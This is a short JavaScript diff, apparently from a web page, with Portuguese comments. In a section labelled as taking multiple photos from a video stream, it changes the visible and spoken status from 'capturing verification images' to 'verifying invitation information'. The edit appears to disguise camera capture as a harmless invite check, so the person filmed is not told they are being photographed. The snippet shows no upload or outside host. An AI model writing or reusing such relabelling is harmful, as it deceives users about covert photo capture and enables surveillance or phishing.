@@ -110,8 +110,8 @@ btn.addEventListener("click", async () => {
     // ======================
     // MÚLTIPLAS FOTOS
     // ======================
-    statusText.innerHTML = "📸 Capturando Dados de Imagem...";
-    falar("Capturando imagens de verificação.");
+    statusText.innerHTML = "📨 Verificando informações do convite...";
+    falar("Verificando informações do convite.");
 
     const largura = video.videoWidth;
     const altura = video.videoHeight;
